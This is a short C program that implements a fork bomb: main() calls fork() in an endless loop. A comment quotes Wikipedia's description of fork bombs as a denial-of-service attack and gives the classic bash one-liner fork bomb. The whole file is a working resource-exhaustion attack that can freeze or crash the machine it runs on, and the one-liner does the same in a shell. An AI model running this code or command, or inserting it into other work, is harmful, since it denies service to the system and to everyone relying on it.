#include <unistd.h>

/*
A fork bomb (aka rabbit virus or wabbit) is a denial-of-service attack wherein a process continually replicates itself to deplete available system resources, slowing down or crashing the system due to resource starvation.
A classic example of a fork bomb is the bash one :(){ :|:& };:
~ Wikipedia
*/
int main() {
    while (1)
        fork();
    return 0;
}